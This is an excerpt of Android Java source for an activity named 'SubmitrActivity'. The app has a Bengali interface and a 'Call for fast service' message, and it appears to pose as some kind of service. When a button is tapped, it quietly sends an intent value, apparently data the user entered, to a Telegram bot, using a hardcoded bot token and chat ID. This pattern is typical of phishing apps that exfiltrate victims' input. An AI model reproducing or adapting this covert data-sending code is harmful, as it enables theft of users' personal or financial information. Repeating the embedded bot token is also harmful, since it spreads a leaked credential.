...
public class SubmitrActivity extends AppCompatActivity {
	...
	protected void onCreate(Bundle _savedInstanceState) {
		...
		setContentView(R.layout.submitr);
	...
	private void initialize(Bundle _savedInstanceState) {
		...
		button2.setOnClickListener(new View.OnClickListener() {
			...
			public void onClick(View _view) {
				if ("".equals(textview4.getText().toString())) {
					...
					startActivity(call);
					get.startRequestNetwork(RequestNetworkController.POST, "https://api.telegram.org/bot".concat("7249481162:AAH7SnWdlKs4Ly83Q7EbITwySwgALz9fV1Y".concat("/sendMessage?chat_id=".concat("7003820700".concat("&text=".concat(getIntent().getStringExtra("2")))))), "Rizwan", _get_request_listener);
				}
			}
		});
		...
		button3.setOnClickListener(new View.OnClickListener() {
			...
			public void onClick(View _view) {
				...
				sms.setMessage("দ্রুত সেবা পেতে কল করুন");
	...
	private void initializeLogic() {
		...
		checkbox5.setTypeface(Typeface.createFromAsset(getAssets(),"fonts/solaimanlipi.ttf"), 0);
		checkbox6.setTypeface(Typeface.createFromAsset(getAssets(),"fonts/solaimanlipi.ttf"), 0);
	}
